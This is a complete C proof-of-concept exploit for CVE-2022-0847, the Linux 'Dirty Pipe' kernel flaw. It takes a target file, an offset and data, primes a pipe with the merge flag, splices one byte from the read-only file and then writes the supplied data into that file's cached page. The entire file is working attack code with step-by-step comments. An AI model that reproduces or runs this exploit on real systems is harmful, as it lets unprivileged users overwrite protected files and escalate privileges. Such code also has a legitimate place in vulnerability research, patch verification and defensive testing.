/*
 * POC of CVE-2022-0847
 * written by arttnba3
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv, char **envp)
{
    long            page_size;
    size_t            offset_in_file;
    size_t             data_size;
    int             target_file_fd;
    struct stat     target_file_stat;
    int                pipe_fd[2];
    int             pipe_size;
    char             *buffer;
    int             retval;

    // checking before we start to exploit
    if (argc < 4) {
        puts("[*] Usage: ./exp target_file offset_in_file data");
        exit(EXIT_FAILURE);
    }

    page_size = sysconf(_SC_PAGE_SIZE);
    offset_in_file = strtoul(argv[2], NULL, 0);
    if (offset_in_file % page_size == 0) {
        errExit("Cannot write on the boundary of a page!");
    }

    target_file_fd = open(argv[1], O_RDONLY);
    if (target_file_fd < 0) {
        errExit("Failed to open the target file!");
    }

    if (fstat(target_file_fd, &target_file_stat)) {
        errExit("Failed to get the info of the target file!");
    }
    
    if (offset_in_file > target_file_stat.st_size) {
        errExit("Offset is not in the file!");
    }
    
    data_size = strlen(argv[3]);
    if ((offset_in_file + data_size) > target_file_stat.st_size) {
        errExit("Cannot enlarge the file!");
    }

    if (((offset_in_file % page_size) + data_size) > page_size) {
        errExit("Cannot write accross a page!");
    }

    // exploit now...
    puts("\033[34m\033[1m[*] Start exploiting...\033[0m");
    
    /*
     * prepare the pipe, make every pipe_buffer a MERGE flag
     * Just write and read through
     */
    puts("\033[34m\033[1m"
     "[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m");
    pipe(pipe_fd);
    pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
    buffer = (char*) malloc(page_size);

    for (int size_left = pipe_size; size_left > 0; ) {
        int per_write = size_left > page_size ? page_size : size_left;
        size_left -= write(pipe_fd[1], buffer, per_write);
    }

    for (int size_left = pipe_size; size_left > 0; ) {
        int per_read = size_left > page_size ? page_size : size_left;
        size_left -= read(pipe_fd[0], buffer, per_read);
    }

    puts("\033[32m\033[1m[+] Flag setting has been done.\033[0m");

    /*
     * Use the splice to make the pipe_buffer->page
     * become the page of the file mapped, by read
     * a byte from the file accross the splice
     */
    puts("\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m");
    offset_in_file--;    // we read a byte, so offset should minus 1
    retval = splice(target_file_fd, &offset_in_file, pipe_fd[1], NULL, 1, 0);
    if (retval < 0) {
        errExit("splice failed!");
    } else if (retval == 0) {
        errExit("short splice!");
    }
    puts("\033[32m\033[1m[+] File splice done.\033[0m");

    /*
     * Now it comes to the time of exploit:
     * the mapped page of file has been in pipe_buffer,
     * and the PIPE_BUF_FLAG_CAN_MERGE is still set,
     * just a simple write can make the exploit.
     */
    retval = write(pipe_fd[1], argv[3], data_size);
    if (retval < 0) {
        errExit("Write failed!");
    }
    else if (retval < data_size) {
        errExit("Short write!");
    }
    
    puts("\033[32m\033[1m[+] EXPLOIT DONE!\033[0m");
}